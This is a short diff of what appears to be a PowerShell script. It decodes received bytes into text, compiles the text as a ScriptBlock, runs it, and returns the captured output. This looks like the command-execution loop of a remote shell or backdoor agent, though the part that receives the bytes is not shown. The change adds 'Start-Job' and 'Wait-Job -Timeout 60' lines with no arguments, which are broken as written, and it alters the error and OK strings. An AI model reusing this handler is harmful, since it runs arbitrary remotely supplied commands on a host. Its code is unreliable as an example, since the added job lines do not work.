@@ -25,6 +25,9 @@ $Commands = [System.Text.Encoding]::UTF8.GetString($Datos, 0, $Saints)
 
 $ErrorActionPreference = 'Stop'
 
+Start-Job
+Wait-Job -Timeout 60
+
 Try {
 
 $ScriptBlocks = [ScriptBlock]::Create($Commands)
@@ -34,15 +37,13 @@ $Results = & $ScriptBlocks 2>&1 | Out-String
 }
 Catch {
 
-#$Results = $_.Exception.Message
-
-$Results = "[ERROR] " + $_.Exception.Message
+$Results = $_.Exception.Message
 
 }
 
 if([String]::IsNullOrWhiteSpace($Results)){
 
-$Results = "[OK]"
+$Results = "<.::[OK]::.>"
 
 }
 
